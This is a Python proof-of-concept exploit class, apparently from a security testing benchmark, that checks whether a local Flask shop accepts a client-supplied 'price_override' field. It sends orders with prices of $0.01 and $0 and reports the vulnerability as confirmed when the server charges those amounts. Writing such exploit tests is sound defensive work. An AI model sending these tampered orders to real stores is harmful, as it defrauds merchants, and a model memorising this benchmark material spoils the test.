"""PoC exploit: Price override via client trust (CWE-20).

After stage 3, the server accepts a client-supplied price_override
that replaces the server-calculated price. An attacker can set
the price to $0.01 for any product.
"""

from mosaic.oracle.exploit import ExploitTest


class PriceTrustExploit(ExploitTest):
    """Price trust: client sets order price to $0.01."""

    def __init__(self, base_url: str = "http://localhost:5000"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "flask_price_trust"

    def execute(self) -> tuple[bool, str]:
        """Create an order with price_override=$0.01."""
        evidence = []

        # Baseline: normal order at catalog price
        baseline = self.http_post("/api/orders", json={
            "product_id": "enterprise_plan",
            "quantity": 1,
        })
        baseline_total = None
        if baseline.ok:
            try:
                data = baseline.json()
                baseline_total = data.get("total") or data.get("final_total")
                evidence.append(f"Baseline: enterprise_plan total={baseline_total}")
            except Exception:
                pass

        # Attack: override price to $0.01
        attack = self.http_post("/api/orders", json={
            "product_id": "enterprise_plan",
            "quantity": 10,
            "price_override": 0.01,
        })

        if not attack.ok:
            return False, f"Attack request failed: {attack.status_code}. {attack.text[:300]}"

        try:
            data = attack.json()
            total = data.get("total") or data.get("final_total")
            unit_price = data.get("unit_price")

            if total is not None and float(total) < 1.0:
                evidence.append(
                    f"Attack: price_override=0.01 accepted. "
                    f"total={total}, unit_price={unit_price}. "
                    f"10 enterprise plans for ${total}."
                )
                return True, (
                    f"Price override confirmed (CWE-20). Server accepts "
                    f"client-supplied price_override and uses it as the unit "
                    f"price. Attacker pays ${total} for 10x enterprise_plan "
                    f"(catalog price $199.99 each). " + " | ".join(evidence)
                )

            if unit_price is not None and float(unit_price) < 1.0:
                return True, (
                    f"Price override confirmed (CWE-20). unit_price={unit_price} "
                    f"from client override. " + " | ".join(evidence)
                )

            evidence.append(f"Attack response: total={total}, unit_price={unit_price}")
        except Exception as e:
            evidence.append(f"Parse error: {e}")

        # Test with zero price
        zero = self.http_post("/api/orders", json={
            "product_id": "premium_plan",
            "quantity": 1,
            "price_override": 0,
        })
        if zero.ok:
            try:
                data = zero.json()
                total = data.get("total") or data.get("final_total")
                if total is not None and float(total) == 0:
                    return True, (
                        f"Price override confirmed (CWE-20). "
                        f"price_override=0 accepted, total=$0. " + " | ".join(evidence)
                    )
            except Exception:
                pass

        return False, "Price override not accepted. " + " | ".join(evidence)
